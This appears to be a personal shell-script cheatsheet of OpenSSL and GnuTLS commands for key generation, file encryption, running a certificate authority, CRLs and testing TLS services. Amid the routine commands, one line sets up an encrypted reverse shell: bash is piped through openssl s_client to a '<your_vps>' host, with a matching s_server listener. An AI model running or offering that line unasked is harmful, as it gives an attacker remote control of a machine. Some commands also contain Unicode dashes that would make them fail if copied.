#!/bin/sh
##-=================================================-##
##   [+] Xe1phix-[OpenSSL]-[GnuTLS]-Cheatsheet-[v*.*.*.].sh
##-=================================================-##
## ------------------------------------------------------------------------------------------- ##
##   [?] 
## ------------------------------------------------------------------------------------------- ##



echo "## ============================================= ##"
echo "##   [+] "
echo "## ============================================= ##"
openssl genpkey -algorithm RSA -out key.pem



echo "## ============================================= ##"
echo "##   [+] Encrypt and decrypt A single file:"
echo "## ============================================= ##"
openssl aes‐128‐cbc ‐salt ‐in file ‐out file.aes 
openssl aes‐128‐cbc ‐d ‐salt ‐in file.aes ‐out file 








echo "## ============================================= ##"
OpenSSL
echo "## ============================================= ##"

echo "## ============================================= ##"
echo "Encrypt and decrypt A single file:"
echo "## ============================================= ##"
openssl aes‐128‐cbc ‐salt ‐in file ‐out file.aes 
openssl aes‐128‐cbc ‐d ‐salt ‐in file.aes ‐out file 


echo "## ======================================================= ##"
echo -e "\tNote that the file can of course be a tar archive."
echo -e "\t tar and encrypt a whole directory"
echo "## ======================================================= ##"
echo "## --------------------------------------------------------------------------- ##"
tar ‐cf ‐ directory | openssl aes‐128‐cbc ‐salt ‐out directory.tar.aes      # Encrypt 
openssl aes‐128‐cbc ‐d ‐salt ‐in directory.tar.aes | tar ‐x ‐f ‐            # Decrypt 
echo "## --------------------------------------------------------------------------- ##"

echo "## ======================================================= ##"
echo -e "\t\ttar zip and encrypt a whole directory"
echo "## ======================================================= ##"
echo
echo "## --------------------------------------------------------------------------- ##"
tar ‐zcf ‐ directory | openssl aes‐128‐cbc ‐salt ‐out directory.tar.gz.aes  # Encrypt 
openssl aes‐128‐cbc ‐d ‐salt ‐in directory.tar.gz.aes | tar ‐xz ‐f ‐        # Decrypt
echo "## --------------------------------------------------------------------------- ##"
echo
echo "## ======================================================= ##"
echo -e "\t\tGenerate Checksum from file"
echo "## ======================================================= ##"

echo "## --------------------------------------------------------------------------- ##"
openssl md5 file.tar.gz            # Generate an md5 checksum from file 
openssl sha1 file.tar.gz           # Generate an sha1 checksum from file 
openssl rmd160 file.tar.gz         # Generate a RIPEMD‐160 checksum from file 
echo "## --------------------------------------------------------------------------- ##"


gpg --symmetric --cipher $cipher --armor $sourcefile



echo "## =========================================== ##"
echo -e "\t\tCreate a certificate authority"
echo "## =========================================== ##"
echo "## ============================================================================================================= ##"
openssl req ‐new ‐x509 ‐days 730 ‐config /etc/ssl/openssl.cnf ‐keyout CA/private/cakey.pem ‐out CA/cacert.pem
echo "## ============================================================================================================= ##"
openssl req ‐new ‐keyout newkey.pem ‐out newreq.pem ‐config /etc/ssl/openssl.cnf 
openssl req ‐nodes ‐new ‐keyout newkey.pem ‐out newreq.pem ‐config /etc/ssl/openssl.cnf       # No encryption for the key 
echo "## ============================================================================================================= ##"

echo "## =========================================== ##"
echo -e "\t\tSign the certificate"
echo "## =========================================== ##"

echo "## ------------------------------------------- ##"
cat newreq.pem newkey.pem > new.pem 
echo "## ============================================================================================================= ##"
openssl ca ‐policy policy_anything ‐out servernamecert.pem ‐config /etc/ssl/openssl.cnf ‐infiles new.pem 
echo "## ============================================================================================================= ##"
mv newkey.pem servernamekey.pem 
echo "## ------------------------------------------- ##"



CA/private/cakey.pem (CA server private key)
CA/cacert.pem (CA server public key)
certs/servernamekey.pem (server private key)
certs/servernamecert.pem (server signed certificate)
certs/servername.pem (server certificate with private key)



openssl x509 ‐text ‐in servernamecert.pem      # View the certificate info 
openssl req ‐noout ‐text ‐in server.csr        # View the request info 
openssl s_client ‐connect cb.vu:443            # Check a web server certificate 








echo "## =========================================== ##"
echo -e "\t\tTo create an RSA private key:"
echo "## =========================================== ##"
certtool --generate-privkey --outfile key.pem --rsa


echo "## ============================================================================= ##"
echo -e "\tprivate key is stored in a smart card you can generate a request"
echo "## ============================================================================= ##"
certtool --generate-request --load-privkey "pkcs11:..." --load-pubkey "pkcs11:..."


echo "## ============================================================================= ##"
echo -e "\t\tCreate self-signed certificate"
echo "## ============================================================================= ##"
certtool --generate-privkey --outfile ca-key.pem
certtool --generate-self-signed --load-privkey ca-key.pem --outfile ca-cert.pem

certtool --generate-certificate --load-request request.pem --outfile cert.pem --load-ca-certificate ca-cert.pem --load-ca-privkey ca-key.pem


echo "## ============================================================================= ##"
echo -e "\tGenerate a certificate using the private key only, use the command:"
echo "## ============================================================================= ##"
certtool --generate-certificate --load-privkey key.pem --outfile cert.pem --load-ca-certificate ca-cert.pem --load-ca-privkey ca-key.pem


echo "## ======================================= ##"
echo -e "\t\tCertificate information"
echo "## ======================================= ##"
certtool --certificate-info --infile cert.pem

echo "## ============================================================================= ##"
echo "Generate a PKCS #12 structure using the previous key and certificate, use the command:"
echo "## ============================================================================= ##"
certtool --load-certificate cert.pem --load-privkey key.pem --to-p12 --outder --outfile key.p12

certtool --load-ca-certificate ca.pem --load-certificate cert.pem --load-privkey key.pem --to-p12 --outder --outfile key.p12

echo "## ============================================================================= ##"
echo -e "\tGenerate Diffie-Hellman key exchange parameters:"
echo "## ============================================================================= ##"
certtool --generate-dh-params --outfile dh.pem --sec-param medium

certtool --generate-privkey > proxy-key.pem
certtool --generate-proxy --load-ca-privkey key.pem --load-privkey proxy-key.pem --load-certificate cert.pem --outfile proxy-cert.pem

echo "## ============================================================ ##"
echo -e "\t\tCertificate revocation list generation"
echo -e "\tCreate an empty Certificate Revocation List (CRL) do:"
echo "## ============================================================ ##"
certtool --generate-crl --load-ca-privkey x509-ca-key.pem --load-ca-certificate x509-ca.pem

echo "## ============================================================================= ##"
echo -e "\tcreate a CRL that contains some revoked certificates, "
echo -e "place the certificates in a file and use --load-certificate as follows:"
echo "## ============================================================================= ##"
certtool --generate-crl --load-ca-privkey x509-ca-key.pem --load-ca-certificate x509-ca.pem --load-certificate revoked-certs.pem


echo "## ============================================================ ##"
echo -e "\t\tverify a Certificate Revocation List (CRL):"
echo "## ============================================================ ##"
certtool --verify-crl --load-ca-certificate x509-ca.pem < crl.pem














cd /etc/ssl/certs
/usr/share/ssl/misc/CA -newca


## create a SSL .cnf file for your new CA.

cp /usr/share/ssl/openssl.cnf /etc/ssl/certs/puppyCA/openssl.cnf


reating a Certificate Request
openssl req -config /etc/ssl/certs/puppyCA/openssl.cnf -new -keyout puppy.yourdomain.com.key.pem -out puppy.yourdomain.com.csr


Signing Your Certificate Request
openssl ca -config /etc/ssl/certs/puppyCA/openssl.cnf -policy policy_anything -out puppy.yourdomain.com.cert.pem -infiles puppy.yourdomain.com.csr





cd /etc/ssl
chmod 0755 certs
cd certs
chmod -R 0400 *



Creating a CRL
cd /etc/ssl/certs/puppyCA/
openssl ca -gencrl -out crl.pem -config /etc/ssl/certs/puppyCA/openssl.cnf



Revoking a Certificate
openssl ca -revoke puppy.yourdomain.com.cert.pem -config /etc/ssl/puppyCA/openssl.cnf







gnutls-cli --crlf --starttls     --x509cafile /etc/pki/CA/cacert.pem     --port 25 mail.mydomainname.com



gnutls-cli --port 9998 --x509cafile afternetca.cer lumiere.us.afternet.org



openssl s_client -connect imap.gmail.com:993
 
gnutls-cli imap.gmail.com -p 993
 
socat openssl:imap.gmail.com:993 stdio
 
socat ssl:imap.gmail.com:993 readline
 
ncat --ssl imap.gmail.com 993
 
telnet-ssl -z ssl imap.gmail.com 993


gnutls-cli -p 5223 talk.google.com


gnutls-cli granger.herm -p 389 --starttls-proto=ldap


openssl s_server -accept 8443 -cert server.pem -key server.pem -cipher eNULL


openssl s_client -connect 192.168.254.208:40004 </dev/null 2>/dev/null | openssl x509 -outform PEM > cert.pem
 
openssl s_server -cert ... -verify 2



openssl s_client -starttls imap -connect 127.0.0.1:1143 -showcerts




gnutls-cli granger.herm -p 389 --starttls-proto=ldap



openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 80

mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <your_vps>:1024 > /tmp/s; rm /tmp/s






openssl s_server -msg -tlsextdebug -state -cert ../radsecproxy-test.crt -key ../radsecproxy-test.key






openssl s_server -accept 1111 -cert server/server.crt -key server/server.key -CAfile client/int-root.crt -verify 1















Testing an MTA Using openssl s_client
openssl s_client -connect puppy.yourdomain.com:25 -starttls smtp



connect to a non-MTA client such as an IMAP server. Enter the following:
openssl s_client -connect puppy.yourdomain.com:993



Starting a Test SSL Server Using the openssl s_server Function
openssl s_server -key puppy.yourdomain.com.key.pem -cert puppy.yourdomain.com.cert.pem








Setting Up an SSL Certificate for Apache2


openssl -x509 -text -in server.crt

openssl verify -CAfile /path/to/trusted_ca.crt -purpose sslserver my.domain.org.crt


openssl x509 -noout -modulus -in my.domain.org.pem | openssl sha1
openssl rsa -noout -modulus -in my.domain.org.key | openssl sha1



cp my.domain.org.key my.domain.org.crt /etc/apache2/ssl
chown root:root my.domain.org.key; chmod og-r my.domain.org.key
chown root:root my.domain.org.crt; chmod a+r my.domain.org.crt






#mkdir -p /etc/ssl/private/
#openssl req -x509 -nodes -newkey rsa:4096 -keyout /etc/ssl/private/pure-ftpd.pem -out /etc/ssl/private/pure-ftpd.pem
#chmod -f 0600 /etc/ssl/private/*.pem


--verbose

--x509crlfile=
--x509cafile=
--x509keyfile= 
--x509certfile=


--sni-hostname=
--verify-hostname=

--starttls
--starttls-proto=
https, ftp, smtp, imap, ldap, xmpp, lmtp, pop3, nntp, sieve, postgres


--port=


--save-server-trace=str
--save-client-trace=
--logfile=



--print-cert





gnutls-cli-debug localhost


gnutls-cli-debug --starttls-proto smtp --port 25 localhost







curl https://vmlinux:2376/images/json --cert ~/.docker/cert.pem --key ~/.docker/key.pem --cacert ~/.docker/ca.pem

